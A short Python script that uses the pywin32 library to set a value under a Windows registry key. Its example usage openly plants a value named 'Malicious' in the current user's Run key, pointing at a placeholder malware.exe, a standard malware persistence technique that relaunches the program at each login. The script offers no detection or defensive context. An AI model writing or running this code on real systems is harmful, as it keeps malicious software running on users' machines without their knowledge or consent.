import win32api
import win32con

def modify_registry_value(key_path, value_name, value_data):
    try:
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_SET_VALUE)
        win32api.RegSetValueEx(key, value_name, 0, win32con.REG_SZ, value_data)
        win32api.RegCloseKey(key)
        print(f"Registry key {key_path}\\{value_name} modified successfully.")
    except Exception as e:
        print(f"Failed to modify registry key: {str(e)}")

# Example usage
modify_registry_value("Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Malicious", "C:\\path\\to\\malware.exe")